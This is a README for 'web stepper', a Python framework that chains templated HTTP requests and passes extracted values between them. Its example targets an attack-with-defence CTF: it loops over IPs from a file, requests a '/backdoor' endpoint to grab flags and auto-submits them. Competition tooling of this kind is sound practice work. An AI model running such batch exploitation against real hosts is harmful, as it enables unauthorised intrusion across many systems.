# web stepper

以报文为核心

以步骤为顺序

以结果为导向
```
 pre_replace_result(数据里的变量) -> pre_replace(代码层面的变量) -> 发送请求 -> post_extract(代码层面的变量) -> 存入context
 
 WebPayload<context> [WebStep(data1) -> WebStep(data2) -> WebStep(data3)]
```
# 以AWD比赛 代码示例
```python
from web import WebPayload, WebStep, file2ip_list, file2http_request

flag_submitter = WebStep(
    # $IP, $FLAG
    request_message_template=file2http_request("./requests/submit_flag.http"),
    post_extract={"$?": r"(.*)"},
)

web1 = [
    WebPayload(
        [
            WebStep(
                """
                    GET /backdoor HTTP/1.1
                    Host: $IP:8080
                    User-Agent: CustomAgent
                    Accept: */*
                    Connection: keep-alive

                    """,
                post_extract={"$FLAG": r"flag{.*?}"},
            ),
            flag_submitter,
        ],
    )
]

if __name__ == "__main__":

    def run(ip):
      # for wp in web1 + web2 + web3 + ...:
        for wp in web1:
            try:
                wp.exploit({"$IP": ip}).check()
            except Exception as e:
                print(e)

    list(map(run, file2ip_list("ip.txt")))


```